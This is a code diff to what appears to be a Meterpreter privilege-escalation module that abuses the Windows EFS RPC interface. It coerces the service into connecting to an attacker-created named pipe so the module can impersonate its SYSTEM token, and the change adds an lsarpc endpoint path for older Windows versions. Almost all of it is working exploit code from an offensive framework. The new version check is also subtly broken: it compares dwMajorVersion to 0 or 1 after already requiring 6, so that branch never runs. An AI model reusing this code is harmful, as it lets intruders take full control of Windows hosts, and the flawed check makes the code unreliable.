@@ -6,10 +6,12 @@ typedef NTSTATUS(WINAPI* PRtlGetVersion)(LPOSVERSIONINFOEXW);
 
 RPC_STATUS EfsRpcEncryptFileSrv(handle_t binding_h, wchar_t* FileName);
 
-DWORD WINAPI trigger_efs_connection(LPWSTR pPipeName);
-handle_t efs_bind(wchar_t* target);
+DWORD WINAPI trigger_efs_connection(RPC_WSTR uuid, RPC_WSTR endpoint, LPWSTR pPipeName);
+handle_t efs_bind(RPC_WSTR uuid, RPC_WSTR endpoint, wchar_t* target);
 
-const RPC_WSTR MS_EFSR_UUID = (RPC_WSTR)L"df1941c5-fe89-4e79-bf10-463657acf44d";
+const RPC_WSTR LSARPC_PIPE_MS_EFSR_UUID = (RPC_WSTR)L"c681d488-d850-11d0-8c52-00c04fd90f7e";
+const RPC_WSTR LSARPC_NAMEDPIPE = (RPC_WSTR)L"\\pipe\\lsarpc";
+const RPC_WSTR EFSRPC_PIPE_MS_EFSR_UUID = (RPC_WSTR)L"df1941c5-fe89-4e79-bf10-463657acf44d";
 const RPC_WSTR EFSRPC_NAMEDPIPE = (RPC_WSTR)L"\\pipe\\efsrpc";
 
 DWORD elevate_via_namedpipe_efs(Remote* remote, Packet* packet)
@@ -24,12 +26,10 @@ DWORD elevate_via_namedpipe_efs(Remote* remote, Packet* packet)
 	WCHAR cPipeName2[MAX_PATH] = { 0 };
 	DWORD dwPipeUid[2] = { 0, 0 };
 	PRIV_POST_IMPERSONATION PostImpersonation;
+	const RPC_WSTR *wEndpointUUID = NULL;
+	const RPC_WSTR *wNamedPipeEndpoint = NULL;
 
 	do {
-		if (!does_pipe_exist(L"\\\\.\\pipe\\efsrpc")) {
-			BREAK_ON_ERROR("[ELEVATE] elevate_via_namedpipe_efs: \\pipe\\efsrpc is not listening.");
-		}
-
 		hNtdll = GetModuleHandleA("ntdll");
 		if (hNtdll == NULL) {
 			BREAK_ON_ERROR("[ELEVATE] elevate_via_namedpipe_efs: Failed to resolve RtlGetVersion");
@@ -48,6 +48,22 @@ DWORD elevate_via_namedpipe_efs(Remote* remote, Packet* packet)
 		if (os.dwMajorVersion < 6) {
 			SetLastError(ERROR_CALL_NOT_IMPLEMENTED);
 			BREAK_ON_ERROR("[ELEVATE] elevate_via_namedpipe_efs: Windows versions older than 6.0 are unsupported");
+		}
+
+		// Windows Vista / Server 2008 (6.0 and 6.1) only supports \pipe\lsarpc endpoint
+		if (os.dwMajorVersion == 6 && (os.dwMajorVersion == 0 || os.dwMajorVersion == 1)) {
+			if (!does_pipe_exist(L"\\\\.\\pipe\\lsarpc")) {
+				BREAK_ON_ERROR("[ELEVATE] elevate_via_namedpipe_efs: \\pipe\\lsarpc is not listening.");
+			}
+			wEndpointUUID = &LSARPC_PIPE_MS_EFSR_UUID;
+			wNamedPipeEndpoint = &LSARPC_NAMEDPIPE;
+		}
+		else {
+			if (!does_pipe_exist(L"\\\\.\\pipe\\efsrpc")) {
+				BREAK_ON_ERROR("[ELEVATE] elevate_via_namedpipe_efs: \\pipe\\efsrpc is not listening.");
+			}
+			wEndpointUUID = &EFSRPC_PIPE_MS_EFSR_UUID;
+			wNamedPipeEndpoint = &EFSRPC_NAMEDPIPE;
 		}
 
 		// generate a pseudo random name for the pipe
@@ -83,7 +99,8 @@ DWORD elevate_via_namedpipe_efs(Remote* remote, Packet* packet)
 			Sleep(500);
 		}
 
-		DWORD dwTriggerResult = trigger_efs_connection(cPipeName2);
+		dprintf("[ELEVATE] calling trigger_efs_connection(), using endpoint: %ls", *wNamedPipeEndpoint);
+		DWORD dwTriggerResult = trigger_efs_connection(*wEndpointUUID, *wNamedPipeEndpoint, cPipeName2);
 
 		// signal our thread to terminate if it is still running
 		met_api->thread.sigterm(pThread);
@@ -114,7 +131,7 @@ DWORD elevate_via_namedpipe_efs(Remote* remote, Packet* packet)
 	return dwResult;
 }
 
-DWORD WINAPI trigger_efs_connection(LPWSTR pPipeName)
+DWORD WINAPI trigger_efs_connection(RPC_WSTR uuid, RPC_WSTR endpoint, LPWSTR pPipeName)
 {
 	RPC_STATUS hr = 0;
 	LPWSTR pCaptureServer = NULL;
@@ -130,7 +147,7 @@ DWORD WINAPI trigger_efs_connection(LPWSTR pPipeName)
 		_snwprintf_s(pCaptureServer, MAX_PATH, _TRUNCATE, (LPWSTR)(L"\\\\localhost/pipe/%s/\\%s\\%s"), pPipeName, pPipeName, pPipeName);
 
 		RpcTryExcept
-			ht = efs_bind(L"localhost");
+			ht = efs_bind(uuid, endpoint, L"localhost");
 			if (ht == INVALID_HANDLE_VALUE) {
 				BREAK_WITH_ERROR("[ELEVATE] trigger_efs_connection: Bind error", ERROR_INVALID_HANDLE);
 			}
@@ -178,7 +195,7 @@ DWORD WINAPI trigger_efs_connection(LPWSTR pPipeName)
 	}\
 }
 
-handle_t efs_bind(wchar_t* target)
+handle_t efs_bind(RPC_WSTR uuid, RPC_WSTR endpoint, wchar_t* target)
 {
 	RPC_STATUS RpcStatus;
 	unsigned char RpcError[DCE_C_ERROR_STRING_LEN];
@@ -188,10 +205,10 @@ handle_t efs_bind(wchar_t* target)
 
 	_snwprintf_s(buffer, MAX_PATH, _TRUNCATE, L"\\\\%s", target);
 	RpcStatus = RpcStringBindingComposeW(
-		MS_EFSR_UUID,
+		uuid,
 		(RPC_WSTR)L"ncacn_np",
 		(RPC_WSTR)buffer,
-		EFSRPC_NAMEDPIPE,
+		endpoint,
 		NULL,
 		&StringBinding);
 	CHECK_RPC_STATUS_AND_RETURN("RpcStringBindingComposeW", RpcStatus);
